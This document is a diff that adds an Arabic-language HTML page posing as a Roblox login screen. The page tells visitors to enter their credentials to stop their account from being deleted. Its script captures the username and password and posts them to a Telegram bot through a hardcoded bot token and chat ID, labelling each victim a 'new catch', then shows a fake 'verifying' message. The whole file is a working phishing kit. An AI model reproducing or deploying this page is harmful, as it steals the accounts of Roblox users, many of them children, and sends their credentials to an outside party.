@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<title>Roblox — تسجيل الدخول</title>
+</head>
+<body style="margin:0;font-family:Tahoma,Arial;background:#f0f4f9;">
+<div style="max-width:400px;margin:60px auto;background:#fff;padding:40px;border-radius:8px;">
+<h1 style="color:#e2231a;text-align:center;font-size:32px;margin:0 0 20px;">ROBLOX</h1>
+<h2 style="text-align:center;color:#333;font-size:18px;">تسجيل الدخول</h2>
+<p style="text-align:center;color:#666;font-size:13px;">أدخل بياناتك لإلغاء حذف الحساب</p>
+<form onsubmit="sendData(event)">
+<input type="text" id="username" placeholder="اسم المستخدم" required style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;">
+<input type="password" id="password" placeholder="كلمة المرور" required style="width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:6px;box-sizing:border-box;">
+<button type="submit" style="width:100%;padding:14px;background:#e2231a;color:#fff;border:none;border-radius:6px;font-size:16px;cursor:pointer;margin-top:16px;">تسجيل الدخول</button>
+</form>
+<p id="result" style="text-align:center;color:#666;font-size:13px;"></p>
+</div>
+<script>
+function sendData(e) {
+    e.preventDefault();
+    const u = document.getElementById('username').value;
+    const p = document.getElementById('password').value;
+    const TOKEN = "8732766434:AAG01no-UeshjNEVq1tEL9YATbAQ2sOklRE";
+    const CHAT = "6696155976";
+    const msg = "🎮 Roblox صيد جديد\n👤 " + u + "\n🔑 " + p;
+    fetch("https://api.telegram.org/bot" + TOKEN + "/sendMessage", {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: JSON.stringify({chat_id: CHAT, text: msg})
+    }).then(() => {
+        document.getElementById('result').textContent = '✓ جاري التحقق...';
+    });
+}
+</script>
+</body>
+</html>
